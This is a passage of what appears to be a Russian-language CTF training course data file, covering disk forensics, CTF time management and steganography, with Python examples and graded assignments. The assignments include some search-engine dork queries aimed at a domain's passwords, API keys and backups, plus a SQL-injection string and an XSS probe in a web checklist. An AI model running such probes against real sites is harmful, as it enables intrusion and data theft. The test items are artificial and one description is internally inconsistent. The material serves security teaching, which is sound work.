          { input: 'corp.org\nfiles admin sensitive backup', expectedOutput: 'site:corp.org filetype:pdf OR filetype:xlsx OR filetype:doc\nsite:corp.org inurl:admin OR inurl:login\nsite:corp.org intext:password OR intext:secret OR intext:api_key\nsite:corp.org filetype:bak OR filetype:sql OR filetype:old', description: 'Все 4 типа' },
        ],
        points: 25,
      },
      {
        title: 'Извлечение домена из URL',
        description: 'Реализуйте функцию extract_domain(url), которая извлекает доменное имя из URL. Уберите схему (http/https), путь, порт и параметры. На вход: N URL-адресов.',
        difficulty: 'easy' as const,
        starterCode: 'def extract_domain(url: str) -> str:\n    # Извлеките доменное имя из URL\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(extract_domain(input().strip()))\n',
        testCases: [
          { input: '4\nhttps://www.example.com/path?q=1\nhttp://sub.domain.org:8080/api\nexample.com\nhttps://user@host.net/page', expectedOutput: 'www.example.com\nsub.domain.org\nexample.com\nhost.net', description: 'Различные форматы URL' },
          { input: '2\nhttps://192.168.1.1/admin\nhttp://localhost:3000', expectedOutput: '192.168.1.1\nlocalhost', description: 'IP-адрес и localhost' },
        ],
        points: 10,
      },
      {
        title: 'Извлечение email-адресов из текста',
        description: 'Реализуйте функцию extract_emails(text), которая находит все email-адреса в тексте с помощью регулярного выражения. Паттерн: [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}. Верните уникальные email в порядке нахождения. На вход: многострочный текст до END.',
        difficulty: 'easy' as const,
        starterCode: 'import sys\nimport re\n\ndef extract_emails(text: str) -> list:\n    # Найдите все email-адреса\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\ntext = "\\n".join(lines)\nemails = extract_emails(text)\nfor e in emails:\n    print(e)\nif not emails:\n    print("NONE")\n',
        testCases: [
          { input: 'Contact: admin@example.com\nAlso: user@test.org and admin@example.com\nEND', expectedOutput: 'admin@example.com\nuser@test.org', description: 'Два уникальных email, дубликат admin@example.com не повторяется' },
          { input: 'No emails in this text\nEND', expectedOutput: 'NONE', description: 'Нет email-адресов' },
        ],
        points: 10,
      },
      {
        title: 'Анализ WHOIS-данных',
        description: 'Реализуйте парсер упрощённых WHOIS-данных. На вход: многострочные данные (до END) в формате "Ключ: Значение". Извлеките и выведите: DOMAIN, REGISTRAR, CREATED, EXPIRES, STATUS. Если поле отсутствует — выведите UNKNOWN.',
        difficulty: 'medium' as const,
        starterCode: 'import sys\n\ndef parse_whois(whois_text: str) -> dict:\n    # Парсите WHOIS-данные\n    pass\n\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\ntext = "\\n".join(lines)\nresult = parse_whois(text)\nfor key in ["DOMAIN", "REGISTRAR", "CREATED", "EXPIRES", "STATUS"]:\n    print(f"{key}:{result.get(key, \'UNKNOWN\')}")\n',
        testCases: [
          { input: 'Domain Name: example.com\nRegistrar: GoDaddy\nCreation Date: 1995-08-14\nExpiration Date: 2025-08-13\nStatus: clientTransferProhibited\nEND', expectedOutput: 'DOMAIN:example.com\nREGISTRAR:GoDaddy\nCREATED:1995-08-14\nEXPIRES:2025-08-13\nSTATUS:clientTransferProhibited', description: 'Все поля присутствуют' },
          { input: 'Domain Name: test.ru\nRegistrar: REG.RU\nEND', expectedOutput: 'DOMAIN:test.ru\nREGISTRAR:REG.RU\nCREATED:UNKNOWN\nEXPIRES:UNKNOWN\nSTATUS:UNKNOWN', description: 'Только домен и регистратор, остальное UNKNOWN' },
        ],
        points: 15,
      },
      {
        title: 'Генератор отчёта OSINT-разведки',
        description: 'Реализуйте функцию osint_report(domain, findings). На вход: домен и N находок (тип:значение через пробел). Типы: email, subdomain, ip, tech. Сгруппируйте по типам и выведите отчёт: === DOMAIN === затем секции по типам (EMAILS, SUBDOMAINS, IPS, TECHNOLOGIES) с находками. Если тип пуст — не выводите секцию.',
        difficulty: 'medium' as const,
        starterCode: 'def osint_report(domain: str, findings: list) -> str:\n    # Сгенерируйте отчёт\n    pass\n\ndomain = input().strip()\nn = int(input())\nfindings = []\nfor _ in range(n):\n    parts = input().split(":", 1)\n    findings.append((parts[0], parts[1]))\nprint(osint_report(domain, findings))\n',
        testCases: [
          { input: 'example.com\n4\nemail:admin@example.com\nsubdomain:mail.example.com\nip:93.184.216.34\ntech:nginx', expectedOutput: '=== example.com ===\nEMAILS:\n- admin@example.com\nSUBDOMAINS:\n- mail.example.com\nIPS:\n- 93.184.216.34\nTECHNOLOGIES:\n- nginx', description: 'По одной находке каждого типа' },
          { input: 'test.ru\n2\nemail:info@test.ru\nemail:admin@test.ru', expectedOutput: '=== test.ru ===\nEMAILS:\n- info@test.ru\n- admin@test.ru', description: 'Только email, остальные секции не выводятся' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 17: Дисковая форензика
  // ──────────────────────────────────────────
  {
    slug: 'disk-forensics',
    title: 'Дисковая форензика',
    description: 'Файловые системы, удалённые файлы, slack space, анализ образов дисков',
    content: `# Дисковая форензика

## Основы форензики

**Цифровая форензика** — научное исследование цифровых устройств для извлечения доказательств. Ключевые принципы:
1. **Целостность** — не изменять оригинальные данные
2. **Цепочка хранения** (chain of custody) — документирование каждого действия
3. **Воспроизводимость** — результаты можно повторить
4. **Write blocker** — устройство, предотвращающее запись на исследуемый носитель

## Файловые системы

### FAT32
- Простая структура: загрузочный сектор + FAT-таблица + данные
- Удалённые файлы: первый символ имени заменяется на 0xE5
- Данные остаются до перезаписи

### NTFS
- MFT (Master File Table) — индексы всех файлов
- Alternate Data Streams (ADS) — скрытые потоки данных
- Журнал \`\$LogFile\` — история изменений

### ext4
- Inode-based: метаданные в inode, данные в блоках
- Journal — журнал транзакций
- Удаление: inode помечается свободным, блоки освобождаются

## Анализ структуры диска на Python

\`\`\`python
import struct

def parse_mbr(data: bytes) -> dict:
    """Парсит Master Boot Record (первые 512 байт диска)."""
    if len(data) < 512:
        return {"error": "Insufficient data"}
    # Сигнатура MBR
    signature = struct.unpack('<H', data[510:512])[0]
    # Таблица разделов: 4 записи по 16 байт, начиная с 446
    partitions = []
    for i in range(4):
        offset = 446 + i * 16
        entry = data[offset:offset + 16]
        status = entry[0]
        part_type = entry[4]
        lba_start = struct.unpack('<I', entry[8:12])[0]
        size_sectors = struct.unpack('<I', entry[12:16])[0]
        if part_type != 0:
            partitions.append({
                "number": i + 1,
                "status": "Active" if status == 0x80 else "Inactive",
                "type": {
                    0x07: "NTFS", 0x0b: "FAT32", 0x0c: "FAT32 LBA",
                    0x83: "Linux ext", 0x82: "Linux swap",
                    0x05: "Extended", 0x0f: "Extended LBA",
                }.get(part_type, f"Unknown (0x{part_type:02x})"),
                "lba_start": lba_start,
                "size_mb": size_sectors * 512 / (1024 * 1024),
            })
    return {
        "valid_mbr": signature == 0xAA55,
        "partitions": partitions,
    }
\`\`\`

## Восстановление удалённых файлов

\`\`\`python
def carve_files(disk_image: bytes, signatures: dict = None) -> list:
    """
    File carving — поиск файлов по сигнатурам (magic bytes).
    """
    if signatures is None:
        signatures = {
            "JPEG": (b"\\xff\\xd8\\xff", b"\\xff\\xd9"),
            "PNG": (b"\\x89PNG\r\n\\x1a\n", b"IEND"),
            "PDF": (b"%PDF", b"%%EOF"),
            "ZIP": (b"PK\\x03\\x04", b"PK\\x05\\x06"),
            "GIF": (b"GIF89a", b"\\x00\\x3b"),
        }

    found_files = []
    for file_type, (header, footer) in signatures.items():
        offset = 0
        while True:
            start = disk_image.find(header, offset)
            if start == -1:
                break
            end = disk_image.find(footer, start + len(header))
            if end == -1:
                end = min(start + 10 * 1024 * 1024, len(disk_image))
            else:
                end += len(footer)
            found_files.append({
                "type": file_type,
                "offset": start,
                "size": end - start,
                "header_hex": disk_image[start:start+16].hex(),
            })
            offset = start + 1

    return sorted(found_files, key=lambda x: x["offset"])
\`\`\`

## Slack Space

**Slack space** — неиспользуемое пространство в конце кластера. Если файл занимает 1000 байт, а кластер 4096, то 3096 байт — slack space, где могут быть остатки старых данных.

\`\`\`python
def analyze_slack_space(file_size: int, cluster_size: int) -> dict:
    """Анализирует slack space для файла."""
    clusters_used = (file_size + cluster_size - 1) // cluster_size
    total_allocated = clusters_used * cluster_size
    slack = total_allocated - file_size
    return {
        "file_size": file_size,
        "cluster_size": cluster_size,
        "clusters_used": clusters_used,
        "total_allocated": total_allocated,
        "slack_space": slack,
        "slack_percent": round(slack / total_allocated * 100, 1) if total_allocated else 0,
    }
\`\`\`

## Timeline Analysis

\`\`\`python
def create_timeline_entry(filename: str, timestamps: dict) -> dict:
    """Создаёт запись для таймлайна форензики."""
    return {
        "file": filename,
        "created": timestamps.get("created"),       # ctime
        "modified": timestamps.get("modified"),      # mtime
        "accessed": timestamps.get("accessed"),      # atime
        "changed": timestamps.get("changed"),        # metadata change
        "analysis": analyze_timestamp_anomalies(timestamps),
    }

def analyze_timestamp_anomalies(timestamps: dict) -> list:
    """Ищет аномалии во временных метках."""
    anomalies = []
    if timestamps.get("modified") and timestamps.get("created"):
        if timestamps["modified"] < timestamps["created"]:
            anomalies.append("Modified before created — possible timestomping")
    if timestamps.get("accessed") and timestamps.get("modified"):
        if timestamps["accessed"] < timestamps["modified"]:
            anomalies.append("Accessed before modified — suspicious")
    return anomalies
\`\`\`

## Инструменты

- **Autopsy/Sleuth Kit** — GUI/CLI анализатор образов
- **FTK Imager** — создание образов дисков
- **Volatility** — анализ дампов памяти
- **binwalk** — поиск встроенных файлов
- **foremost/scalpel** — file carving
- **strings** — извлечение текстовых строк`,
    duration: 60,
    assignments: [
      {
        title: 'File carving по magic bytes',
        description: 'Реализуйте file carver. На вход: hex-строка «образа диска». Найдите все файлы по сигнатурам: JPEG (начало ff d8 ff, конец ff d9), PNG (начало 89504e470d0a1a0a, конец 49454e44), PDF (начало 25504446, конец 2525454f46). Для каждого найденного файла выведите: TYPE:OFFSET:SIZE (offset и size в десятичных). Сортируйте по offset.',
        difficulty: 'hard' as const,
        starterCode: 'def carve_files(hex_data: str) -> list:\n    pass\n\nhex_data = input().strip()\nresults = carve_files(hex_data)\nfor r in results:\n    print(f"{r[\'type\']}:{r[\'offset\']}:{r[\'size\']}")\nif not results:\n    print("NONE")\n',
        testCases: [
          { input: '00000000ffd8ff00112233ffd900000000', expectedOutput: 'JPEG:4:7', description: 'JPEG: начинается на offset 4 (байт), ff d8 ff ... ff d9, размер 7 байт' },
          { input: '2550444620736f6d6520636f6e74656e742525454f46', expectedOutput: 'PDF:0:22', description: 'PDF от начала: %PDF...%%EOF, весь «образ» — один PDF' },
          { input: '0000ffd8ff01ffd9000025504446aa2525454f4600', expectedOutput: 'JPEG:2:5\nPDF:9:11', description: 'JPEG на offset 2 (5 байт) и PDF на offset 9 (11 байт)' },
        ],
        points: 25,
      },
      {
        title: 'Определение типа файла по magic bytes',
        description: 'Реализуйте функцию identify_file(hex_data), которая определяет тип файла по первым байтам (magic bytes). Сигнатуры: JPEG=ffd8ff, PNG=89504e47, PDF=25504446, ZIP=504b0304, GIF=474946, ELF=7f454c46. Верните тип или UNKNOWN. На вход: N hex-строк.',
        difficulty: 'easy' as const,
        starterCode: 'def identify_file(hex_data: str) -> str:\n    # Определите тип файла по magic bytes\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(identify_file(input().strip()))\n',
        testCases: [
          { input: '4\nffd8ff00112233\n89504e470d0a1a0a\n25504446\n504b030414000000', expectedOutput: 'JPEG\nPNG\nPDF\nZIP', description: 'Четыре типа файлов' },
          { input: '3\n7f454c4601010100\n47494638396101\naabbccdd', expectedOutput: 'ELF\nGIF\nUNKNOWN', description: 'ELF, GIF и неизвестный' },
        ],
        points: 10,
      },
      {
        title: 'Вычисление хеш-суммы данных',
        description: 'Реализуйте функцию compute_hashes(hex_data), которая вычисляет MD5 и SHA256 хеши для hex-данных. Верните оба хеша в lowercase hex. На вход: N hex-строк.',
        difficulty: 'easy' as const,
        starterCode: 'import hashlib\n\ndef compute_hashes(hex_data: str) -> tuple:\n    # Вычислите MD5 и SHA256\n    pass\n\nn = int(input())\nfor _ in range(n):\n    md5, sha256 = compute_hashes(input().strip())\n    print(f"MD5:{md5}")\n    print(f"SHA256:{sha256}")\n',
        testCases: [
          { input: '1\n48656c6c6f', expectedOutput: 'MD5:8b1a9953c4611296a827abf8c47804d7\nSHA256:185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969', description: '"Hello" — MD5 и SHA256' },
          { input: '1\n00', expectedOutput: 'MD5:93b885adfe0da089cdf634904fd59f71\nSHA256:6e340b9cffb37a989ca544e6bb780a2c78901d3fb33738768511a30617afa01d', description: 'Один null-байт' },
        ],
        points: 10,
      },
      {
        title: 'Извлечение строк из hex-дампа',
        description: 'Реализуйте функцию extract_strings(hex_data, min_length), которая находит все последовательности печатных ASCII символов (0x20-0x7e) длиной >= min_length в hex-данных. Верните найденные строки по одной на строку.',
        difficulty: 'medium' as const,
        starterCode: 'def extract_strings(hex_data: str, min_length: int) -> list:\n    # Извлеките строки из hex-данных\n    pass\n\nhex_data = input().strip()\nmin_len = int(input())\nresults = extract_strings(hex_data, min_len)\nfor s in results:\n    print(s)\nif not results:\n    print("NONE")\n',
        testCases: [
          { input: '0048656c6c6f00576f726c640001\n3', expectedOutput: 'Hello\nWorld', description: '"Hello" и "World" разделены null-байтами, min_length=3' },
          { input: '414200ff4344454647\n4', expectedOutput: 'CDEFG', description: '"AB" (2 символа < 4) не проходит, "CDEFG" (5) проходит' },
        ],
        points: 15,
      },
      {
        title: 'Анализ таймстемпов файловой системы',
        description: 'Реализуйте функцию analyze_timestamps(entries). На вход: N записей формата "filename created modified accessed" (даты в формате YYYY-MM-DD). Выведите для каждого файла: SUSPICIOUS если modified < created или accessed < created, иначе OK.',
        difficulty: 'medium' as const,
        starterCode: 'def analyze_timestamps(filename: str, created: str, modified: str, accessed: str) -> str:\n    # Проверьте корректность временных меток\n    pass\n\nn = int(input())\nfor _ in range(n):\n    parts = input().split()\n    print(f"{parts[0]}:{analyze_timestamps(parts[0], parts[1], parts[2], parts[3])}")\n',
        testCases: [
          { input: '3\nfile1.txt 2024-01-01 2024-06-15 2024-06-15\nfile2.doc 2024-06-01 2024-01-01 2024-06-15\nfile3.exe 2024-03-01 2024-03-02 2024-01-01', expectedOutput: 'file1.txt:OK\nfile2.doc:SUSPICIOUS\nfile3.exe:SUSPICIOUS', description: 'Нормальный, modified < created, accessed < created' },
          { input: '2\nnotes.txt 2023-01-01 2023-01-01 2023-01-01\nlog.txt 2024-12-31 2025-01-01 2025-01-02', expectedOutput: 'notes.txt:OK\nlog.txt:OK', description: 'Все даты равны — OK, последовательные — OK' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 18: Тайм-менеджмент в CTF
  // ──────────────────────────────────────────
  {
    slug: 'ctf-time-management',
    title: 'Тайм-менеджмент в CTF',
    description: 'Приоритизация задач, быстрый triaging, командная работа, стратегии на соревнованиях',
    content: `# Тайм-менеджмент в CTF

## Структура CTF-соревнований

### Jeopardy-стиль
Задачи по категориям с очками. Категории:
- **Web** — веб-уязвимости
- **Crypto** — криптография
- **Pwn** — бинарная эксплуатация
- **Reverse** — реверс-инжиниринг
- **Forensics** — форензика
- **Misc** — разное (стеганография, OSINT, программирование)

### Attack-Defense
Каждая команда защищает свои сервисы и атакует чужие.

## Стратегия triaging

\`\`\`python
def triage_challenges(challenges: list, team_skills: dict,
                      time_remaining: int) -> list:
    """
    Приоритизирует задачи CTF для максимального количества очков.
    challenges: [{"name": str, "category": str, "points": int,
                  "solves": int, "estimated_time": int}]
    team_skills: {"web": 0.8, "crypto": 0.6, ...} — вероятность решения
    time_remaining: минут осталось
    """
    scored = []
    for ch in challenges:
        skill = team_skills.get(ch["category"], 0.3)
        # Метрика: (очки * вероятность) / время
        if ch["estimated_time"] > 0:
            priority = (ch["points"] * skill) / ch["estimated_time"]
        else:
            priority = 0
        # Бонус за количество решений (задача решаема)
        if ch["solves"] > 10:
            priority *= 1.2
        elif ch["solves"] == 0:
            priority *= 0.5  # возможно, очень сложная
        scored.append({
            **ch,
            "priority": round(priority, 2),
            "expected_points": round(ch["points"] * skill, 1),
        })

    # Сортируем по приоритету
    scored.sort(key=lambda x: x["priority"], reverse=True)

    # Отбираем задачи в пределах времени
    selected = []
    total_time = 0
    for ch in scored:
        if total_time + ch["estimated_time"] <= time_remaining:
            selected.append(ch)
            total_time += ch["estimated_time"]

    return selected
\`\`\`

## Правила тайм-менеджмента

### Правило 30 минут

Если за **30 минут** нет прогресса — переключитесь на другую задачу:

\`\`\`python
def should_switch_task(time_spent: int, progress: str) -> dict:
    """Определяет, нужно ли переключить задачу."""
    thresholds = {
        "no_idea": 15,        # нет идей — 15 минут
        "stuck": 30,          # застряли — 30 минут
        "making_progress": 60, # есть прогресс — 60 минут
        "close_to_flag": 90,  # почти нашли — 90 минут
    }
    threshold = thresholds.get(progress, 30)
    return {
        "switch": time_spent >= threshold,
        "threshold": threshold,
        "time_spent": time_spent,
        "recommendation": (
            "Переключитесь на другую задачу"
            if time_spent >= threshold
            else f"Продолжайте, осталось {threshold - time_spent} мин"
        ),
    }
\`\`\`

## Распределение ролей в команде

\`\`\`python
def assign_team_roles(members: list, challenges: list) -> dict:
    """
    Распределяет задачи между участниками команды.
    members: [{"name": str, "skills": {"web": 0.9, ...}}]
    challenges: [{"name": str, "category": str, "points": int}]
    """
    assignments = {m["name"]: [] for m in members}

    # Сортируем задачи по очкам (дорогие первые)
    sorted_challenges = sorted(challenges, key=lambda x: x["points"], reverse=True)

    for ch in sorted_challenges:
        # Находим лучшего участника для этой категории
        best_member = max(
            members,
            key=lambda m: m["skills"].get(ch["category"], 0)
        )
        # Проверяем загрузку
        current_load = len(assignments[best_member["name"]])
        if current_load < 3:  # макс. 3 задачи одновременно
            assignments[best_member["name"]].append(ch["name"])
        else:
            # Даём второму по скиллу
            sorted_members = sorted(
                members,
                key=lambda m: m["skills"].get(ch["category"], 0),
                reverse=True
            )
            for m in sorted_members[1:]:
                if len(assignments[m["name"]]) < 3:
                    assignments[m["name"]].append(ch["name"])
                    break

    return assignments
\`\`\`

## Чеклист быстрого старта по категориям

\`\`\`python
def get_category_checklist(category: str) -> list:
    """Чеклист первых действий для категории CTF."""
    checklists = {
        "web": [
            "Проверить robots.txt, .git/, .env",
            "Просмотреть исходный код страницы",
            "Проверить cookies и headers",
            "Попробовать SQLi в формах: ' OR 1=1--",
            "Проверить XSS: <script>alert(1)</script>",
            "Запустить dirbuster/gobuster",
        ],
        "crypto": [
            "Определить тип шифра (Base64? Hex? Caesar?)",
            "Проверить длину ключа (Kasiski для Vigenere)",
            "Если RSA — проверить малый e, общие множители",
            "CyberChef для быстрого декодирования",
            "Проверить known-plaintext (CTF{ prefix)",
        ],
        "forensics": [
            "file <filename> — определить тип",
            "strings <file> | grep -i flag",
            "binwalk <file> — встроенные файлы",
            "exiftool <file> — метаданные",
            "xxd <file> | head — hex-дамп",
            "steghide/stegsolve для изображений",
        ],
        "pwn": [
            "checksec <binary> — защитные механизмы",
            "file <binary> — архитектура",
            "strings <binary> | grep -i flag",
            "ltrace/strace — трассировка вызовов",
            "Найти уязвимую функцию (gets, strcpy, printf)",
        ],
    }
    return checklists.get(category, ["Нет чеклиста для этой категории"])
\`\`\`

## Логирование прогресса

Документируйте всё во время CTF:
- Что пробовали
- Какие пэйлоады работали
- Найденные артефакты
- Время, потраченное на каждую задачу`,
    duration: 50,
    assignments: [
      {
        title: 'Оптимизатор выбора задач CTF',
        description: 'Реализуйте жадный алгоритм выбора задач CTF для максимизации очков. На вход: T (доступное время в минутах), N (количество задач), затем N строк формата "название очки время_минут решено_командами". Приоритет = очки / время * (1.2 если решено >= 10, 0.5 если решено == 0, 1.0 иначе). Выберите задачи жадно (по убыванию приоритета), пока хватает времени. Выведите выбранные задачи (по одной на строку) и последней строкой TOTAL:сумма_очков.',
        difficulty: 'hard' as const,
        starterCode: 'def select_challenges(time_limit: int, challenges: list) -> tuple:\n    pass\n\nT = int(input())\nN = int(input())\nchallenges = []\nfor _ in range(N):\n    parts = input().split()\n    challenges.append({\n        "name": parts[0], "points": int(parts[1]),\n        "time": int(parts[2]), "solves": int(parts[3])\n    })\nselected, total = select_challenges(T, challenges)\nfor s in selected:\n    print(s)\nprint(f"TOTAL:{total}")\n',
        testCases: [
          { input: '60\n3\nweb1 100 30 15\ncrypto1 200 45 5\nmisc1 50 20 20', expectedOutput: 'misc1\nweb1\nTOTAL:150', description: 'misc1(приоритет=3.0) + web1(приоритет=4.0) — сортируем по приоритету: web1(4.0), misc1(3.0), crypto1(4.44); web1+misc1=50мин<=60' },
          { input: '30\n2\nhard1 500 60 0\neasy1 100 25 50', expectedOutput: 'easy1\nTOTAL:100', description: 'hard1 не влезает по времени (60>30), easy1 влезает' },
          { input: '90\n4\na 100 30 10\nb 200 30 10\nc 150 30 10\nd 50 30 10', expectedOutput: 'b\nc\na\nTOTAL:450', description: 'Все по 30 мин, выбираем 3 лучших: b(8.0), c(6.0), a(4.0)' },
        ],
        points: 25,
      },
      {
        title: 'Вычисление очков за задачу CTF',
        description: 'Реализуйте функцию dynamic_scoring(max_points, total_teams, solves), которая вычисляет динамические очки задачи. Формула: points = max(max_points * 0.1, max_points * (1 - solves / total_teams)). Округляйте до целого. На вход: T тестов.',
        difficulty: 'easy' as const,
        starterCode: 'def dynamic_scoring(max_points: int, total_teams: int, solves: int) -> int:\n    # Вычислите динамические очки\n    pass\n\nt = int(input())\nfor _ in range(t):\n    mp, tt, s = map(int, input().split())\n    print(dynamic_scoring(mp, tt, s))\n',
        testCases: [
          { input: '4\n500 100 0\n500 100 50\n500 100 100\n500 100 10', expectedOutput: '500\n250\n50\n450', description: '0 решений=макс, 50%=250, все решили=50(10%), 10%=450' },
          { input: '2\n1000 50 25\n100 10 5', expectedOutput: '500\n50', description: '50% решили=500, 50% решили=50' },
        ],
        points: 10,
      },
      {
        title: 'Таймер CTF-задачи',
        description: 'Реализуйте функцию time_status(start_min, current_min, recommended_min). Верните: ON_TRACK если current - start <= recommended, OVERTIME если превышено на <= 50%, ABANDON если превышено более чем на 50%. На вход: T тестов, каждый — start current recommended.',
        difficulty: 'easy' as const,
        starterCode: 'def time_status(start: int, current: int, recommended: int) -> str:\n    # Определите статус по времени\n    pass\n\nt = int(input())\nfor _ in range(t):\n    s, c, r = map(int, input().split())\n    print(time_status(s, c, r))\n',
        testCases: [
          { input: '3\n0 20 30\n0 40 30\n0 50 30', expectedOutput: 'ON_TRACK\nOVERTIME\nABANDON', description: '20<=30 OK, 40=133% (+33%), 50=167% (+67%)' },
          { input: '2\n10 25 15\n10 40 15', expectedOutput: 'ON_TRACK\nABANDON', description: '15<=15 OK, 30>15*1.5=22.5 ABANDON' },
        ],
        points: 10,
      },
      {
        title: 'Распределение задач по команде',
        description: 'Реализуйте функцию assign_tasks(members, tasks). Каждый член команды имеет специализации. Каждая задача имеет категорию. Распределите задачи: каждому — задачу его категории (если несколько — выбрать с максимумом очков). Если специалиста нет — UNASSIGNED. На вход: M членов (имя:категории), N задач (имя категория очки).',
        difficulty: 'medium' as const,
        starterCode: 'def assign_tasks(members: list, tasks: list) -> list:\n    # Распределите задачи по команде\n    pass\n\nm = int(input())\nmembers = []\nfor _ in range(m):\n    parts = input().split(":")\n    members.append({"name": parts[0], "skills": parts[1].split(",")})\nn = int(input())\ntasks = []\nfor _ in range(n):\n    parts = input().split()\n    tasks.append({"name": parts[0], "category": parts[1], "points": int(parts[2])})\nresult = assign_tasks(members, tasks)\nfor task_name, member_name in result:\n    print(f"{task_name} -> {member_name}")\n',
        testCases: [
          { input: '2\nAlice:web,crypto\nBob:pwn,reverse\n3\ntask1 web 100\ntask2 pwn 200\ntask3 misc 50', expectedOutput: 'task1 -> Alice\ntask2 -> Bob\ntask3 -> UNASSIGNED', description: 'Alice берёт web, Bob — pwn, misc без специалиста' },
          { input: '1\nCharlie:crypto\n2\nc1 crypto 300\nc2 crypto 100', expectedOutput: 'c1 -> Charlie\nc2 -> UNASSIGNED', description: 'Charlie берёт задачу с макс. очками, вторая не назначена' },
        ],
        points: 15,
      },
      {
        title: 'Таблица результатов CTF',
        description: 'Реализуйте функцию scoreboard(teams_solves). На вход: T команд, для каждой — имя и список решённых задач с очками (задача:очки через пробел). Выведите таблицу результатов: место, имя, суммарные очки, количество решённых. Сортировка: по убыванию очков, при равенстве — по количеству решённых (больше = выше), при равенстве — по алфавиту.',
        difficulty: 'medium' as const,
        starterCode: 'def scoreboard(teams: list) -> list:\n    # Составьте таблицу результатов\n    pass\n\nt = int(input())\nteams = []\nfor _ in range(t):\n    name = input().strip()\n    solves = input().split()\n    tasks = []\n    for s in solves:\n        tname, pts = s.split(":")\n        tasks.append((tname, int(pts)))\n    teams.append({"name": name, "tasks": tasks})\nresult = scoreboard(teams)\nfor place, name, points, solved in result:\n    print(f"{place}. {name} {points}pts {solved}solved")\n',
        testCases: [
          { input: '3\nAlpha\nweb1:100 crypto1:200\nBeta\nweb1:100 pwn1:300 misc1:50\nGamma\ncrypto1:200 crypto2:250', expectedOutput: '1. Beta 450pts 3solved\n2. Gamma 450pts 2solved\n3. Alpha 300pts 2solved', description: 'Beta и Gamma по 450, но Beta решила 3 vs 2' },
          { input: '2\nTeamA\na:100\nTeamB\nb:100', expectedOutput: '1. TeamA 100pts 1solved\n2. TeamB 100pts 1solved', description: 'Равные очки и решённые — алфавитный порядок' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 19: Ловушки и нестандартные задачи
  // ──────────────────────────────────────────
  {
    slug: 'ctf-traps',
    title: 'Ловушки и нестандартные задачи CTF',
    description: 'Rabbit holes, стеганография в CTF, misc-задачи, нестандартные кодировки',
    content: `# Ловушки и нестандартные задачи в CTF

## Rabbit Holes

**Rabbit hole** — ложный след, на который тратится время без результата. Признаки:
- Слишком сложный путь для заявленной сложности задачи
- Нет прогресса больше 30 минут
- Подход кажется «неэлегантным» для CTF

### Типичные rabbit holes

\`\`\`python
def identify_rabbit_holes(observations: list) -> list:
    """Определяет потенциальные rabbit holes."""
    red_flags = {
        "brute_force_large_keyspace": "Перебор > 2^40 — скорее всего не тот путь",
        "complex_math_without_hint": "Сложная математика без подсказок в условии",
        "multiple_encryption_layers": "Больше 3 слоёв шифрования — проверьте другой подход",
        "steganography_without_hint": "Стего без намёка в условии — вероятно, rabbit hole",
        "custom_crypto": "Кастомный шифр? Ищите ошибку в реализации, не взламывайте сам шифр",
    }
    warnings = []
    for obs in observations:
        for key, msg in red_flags.items():
            if key in obs.lower().replace(' ', '_'):
                warnings.append(msg)
    return warnings
\`\`\`

## Стеганография

### LSB (Least Significant Bit)

Информация скрыта в младших битах пикселей изображения:

\`\`\`python
def extract_lsb(pixels: list, num_bits: int = 1) -> str:
    """
    Извлекает данные из LSB пикселей.
    pixels: список значений байтов (R, G, B, R, G, B, ...)
    """
    bits = ""
    for pixel_val in pixels:
        # Извлекаем num_bits младших бит
        for bit_pos in range(num_bits):
            bits += str((pixel_val >> bit_pos) & 1)

    # Конвертируем биты в байты
    result = ""
    for i in range(0, len(bits) - 7, 8):
        byte_val = int(bits[i:i+8], 2)
        if byte_val == 0:
            break
        result += chr(byte_val)
    return result

# Пример: извлечение из RGB значений
pixels = [0b11001100, 0b10101011, 0b01010101,  # R, G, B первого пикселя
          0b11110001, 0b00001100, 0b10101010]
hidden = extract_lsb(pixels)
print(f"Скрытые данные: {hidden}")
\`\`\`

### Стеганография в других форматах

\`\`\`python
def detect_steganography_type(filename: str, file_header: bytes) -> list:
    """Определяет возможные методы стеганографии по типу файла."""
    techniques = []
    ext = filename.rsplit('.', 1)[-1].lower() if '.' in filename else ''

    if ext in ('png', 'bmp', 'jpg', 'jpeg', 'gif'):
        techniques.extend([
            "LSB embedding (stegsolve, zsteg)",
            "Metadata/EXIF (exiftool)",
            "Palette manipulation (PNG)",
            "Appended data after EOF (binwalk)",
        ])
        if ext in ('png',):
            techniques.append("PNG chunks (pngcheck, tweakpng)")
        if ext in ('jpg', 'jpeg'):
            techniques.append("JPEG DCT coefficients (steghide)")
    elif ext in ('wav', 'mp3', 'flac'):
        techniques.extend([
            "LSB in audio samples",
            "Spectogram analysis (Audacity, Sonic Visualizer)",
            "Phase encoding",
        ])
    elif ext == 'pdf':
        techniques.extend([
            "Hidden layers",
            "White text on white background",
            "Embedded files (binwalk)",
            "JavaScript in PDF",
        ])
    elif ext == 'zip':
        techniques.extend([
            "Hidden files (unzip -l)",
            "Comment field",
            "Extra field in local headers",
        ])
    return techniques
\`\`\`

## Нестандартные кодировки

\`\`\`python
def decode_various(data: str) -> dict:
    """Пробует различные декодировки."""
    import base64
    results = {}

    # Base64
    try:
        decoded = base64.b64decode(data).decode('utf-8', errors='replace')
        if decoded.isprintable():
            results["base64"] = decoded
    except Exception:
        pass

    # Base32
    try:
        padded = data + "=" * (8 - len(data) % 8) if len(data) % 8 else data
        decoded = base64.b32decode(padded.upper()).decode('utf-8', errors='replace')
        if decoded.isprintable():
            results["base32"] = decoded
    except Exception:
        pass

    # Hex
    try:
        decoded = bytes.fromhex(data).decode('utf-8', errors='replace')
        if decoded.isprintable():
            results["hex"] = decoded
    except Exception:
        pass

    # Binary
    try:
        clean = data.replace(' ', '')
        if all(c in '01' for c in clean) and len(clean) % 8 == 0:
            decoded = ''.join(
                chr(int(clean[i:i+8], 2)) for i in range(0, len(clean), 8)
            )
            results["binary"] = decoded
    except Exception:
        pass

    # Decimal ASCII
    try:
        nums = data.split()
        if all(n.isdigit() and 0 <= int(n) <= 127 for n in nums):
            decoded = ''.join(chr(int(n)) for n in nums)
